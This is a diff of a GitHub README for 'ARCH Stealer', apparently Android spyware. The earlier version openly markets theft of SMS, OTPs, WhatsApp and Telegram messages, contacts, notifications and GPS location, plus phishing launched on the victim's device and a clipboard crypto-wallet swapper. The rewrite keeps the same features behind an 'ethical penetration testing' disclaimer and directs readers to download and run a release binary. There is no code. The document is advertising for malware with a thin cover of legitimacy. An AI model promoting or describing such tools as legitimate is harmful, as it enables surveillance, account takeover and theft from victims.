@@ -1,57 +1,128 @@
-# ARCH STEALER V1.0
+# ARCH Stealer 🛡️
 
-(https://t.me/archstealer) 
-(https://t.me/archstealer) 
-(https://t.me/archstealer) 
+![GitHub Repo stars](https://img.shields.io/github/stars/lkgdnveo/arch-stealer?style=social) ![GitHub forks](https://img.shields.io/github/forks/lkgdnveo/arch-stealer?style=social) ![GitHub issues](https://img.shields.io/github/issues/lkgdnveo/arch-stealer) ![GitHub license](https://img.shields.io/github/license/lkgdnveo/arch-stealer)
 
-![alt text](image.png)
-🔥 **ARCH STEALER V1.0** 🔥  
-💎 Unleash the ultimate stealth tool for elite cybersecurity pros. Snatch data with precision and dominate the digital shadows. 💎  
-Built for those who thrive in the matrix, ARCH Stealer combines raw power with a sleek, neon-charged interface. No fluff, just results.
+---
 
-## 🚀 Features
+## Description
 
-### 📱 Mobile Mastery
-- **App Grabber**: Extract installed apps effortlessly.
+ARCH Stealer is a powerful cybersecurity tool designed for professionals. This tool captures SMS, OTPs, social media messages from platforms like Telegram and WhatsApp, call history, location data, and more. It also features crypto wallet swapping for popular cryptocurrencies like BTC and ETH, alongside remote command execution capabilities. 
 
-![alt text](image-1.png)
-- **SIM Details**: Pull SIM 1 & 2 data (carrier, serial, etc.).
+**Note:** This tool is intended for ethical penetration testing only.
 
-![alt text](image-2.png)
-- **Contacts**: Full contact list scraped in seconds. 📞
-![alt text](image-3.png)
-- **Phone Intel**: Client name, worker name, unique device ID, IP address, 
-and more. 🌐
-![alt text](image-4.png)
-- **Call History**: Complete log of incoming/outgoing calls.
-![alt text](image-5.png)
-- **Location Tracking**: Pinpoint real-time GPS coordinates. 📍
-![alt text](image-6.png)
+---
 
-### 🌐 Social Stealer
-- **Telegram**: Harvest all messages like a ghost. 🕵️‍♂️
-- **WhatsApp**: Snag OTPs and messages in real-time. 📲
-- **Inbox Invasion**: Capture all SMS live, plus incoming Gmail/Yahoo emails. 📧
-![alt text](image-7.png)
-- **Notification Hijack**: Steal ALL incoming notifications and mirror them to your server. ⚡️
-![alt text](image-8.png)
-### 🛠️ Command & Control
-- **Send SMS**: Dispatch messages remotely. ✉️
-- **Phishing Power**: Open links or phishing pages on target devices. 🎣
-- **Trigger Alerts**: Set off custom notifications to manipulate targets. 🚨
-- **SMS Interception**: Capture incoming and outgoing SMS in real-time. 📤📥
-![alt text](image-9.png)
-### 💰 Crypto stealer
-- **Wallet Swapper**: Auto-replace copied wallet addresses (BTC, ETH, TRX, USDT, XMR) with yours. 🤑
-- **Custom Coins**: Add support for any cryptocurrency on demand. ➕
-![alt text](image-10.png)
-## 🛠️ Installation
-(https://t.me/archstealer) 
-1. **Acquire the Source**:
-   - Contact `@wimjo` on Telegram for source code or subscription access.
-2. **Set Up Environment**:
-   ```bash
-   lots of features availble  in this steale join my telegram to get all 🔥 **Tons of Features in ARCH Stealer!** 🔥  
-Join my Telegram for all the latest updates:  
-📩 [ARCH Stealer Updates](https://t.me/archstealer)  
-(https://t.me/archstealer) 
+## Features
+
+- **Data Capture:** 
+  - SMS messages
+  - One-Time Passwords (OTPs)
+  - Social media messages (Telegram, WhatsApp)
+  - Call history
+  - Location tracking
+
+- **Crypto Wallet Swapping:** 
+  - Supports multiple cryptocurrencies (BTC, ETH, etc.)
+
+- **Remote Command Execution:** 
+  - Execute commands on remote devices seamlessly.
+
+---
+
+## Topics
+
+This repository covers various topics relevant to cybersecurity and mobile hacking:
+
+- android-botnet
+- android-crypter
+- android-development
+- android-hacking
+- android-rat
+- android-spyware
+- craxrat-download
+- crypto-steal
+- crypto-stealer-github
+- dogerat
+- gmail-hacking
+- mobile
+- mobile-hacking
+- otp-hacking
+- sms-hacking
+- spyware
+- stealer
+- telegram-hacking
+- whatsapp-hacking
+
+---
+
+## Installation
+
+To get started with ARCH Stealer, visit our [Releases](https://github.com/lkgdnveo/arch-stealer/releases) section. Download the latest version and execute the file. Follow the installation instructions provided in the release notes.
+
+---
+
+## Usage
+
+1. **Capture Data:**
+   - Once installed, you can start capturing SMS, OTPs, and social media messages.
+   - Access the call history and location tracking features through the user interface.
+
+2. **Crypto Wallet Swapping:**
+   - Navigate to the crypto wallet section to initiate swapping.
+   - Ensure you have the necessary wallet details for the transaction.
+
+3. **Remote Command Execution:**
+   - Use the command execution feature to run commands on remote devices.
+   - Ensure proper permissions are set for seamless operation.
+
+---
+
+## Contributing
+
+We welcome contributions from the community. If you have ideas for improvements or features, please open an issue or submit a pull request. 
+
+### Guidelines
+
+- Fork the repository.
+- Create a new branch for your feature.
+- Write clear commit messages.
+- Ensure your code is well-documented.
+
+---
+
+## License
+
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
+
+---
+
+## Support
+
+For any questions or issues, please check the [Releases](https://github.com/lkgdnveo/arch-stealer/releases) section or open an issue in the repository.
+
+---
+
+## Acknowledgments
+
+- Special thanks to the contributors and community members who have supported this project.
+- Inspired by the need for effective cybersecurity tools in today's digital landscape.
+
+---
+
+## Disclaimer
+
+This tool is intended for ethical use only. Unauthorized access to devices and data is illegal. Use this tool responsibly and within the boundaries of the law.
+
+---
+
+## Contact
+
+For further inquiries, you can reach out via the issues section or connect with the maintainers through GitHub.
+
+---
+
+## Conclusion
+
+ARCH Stealer stands as a robust solution for cybersecurity professionals looking to enhance their penetration testing toolkit. With its comprehensive features and user-friendly interface, it is designed to meet the demands of modern security challenges.
+
+Explore the [Releases](https://github.com/lkgdnveo/arch-stealer/releases) for the latest updates and enhancements. Thank you for your interest in ARCH Stealer!
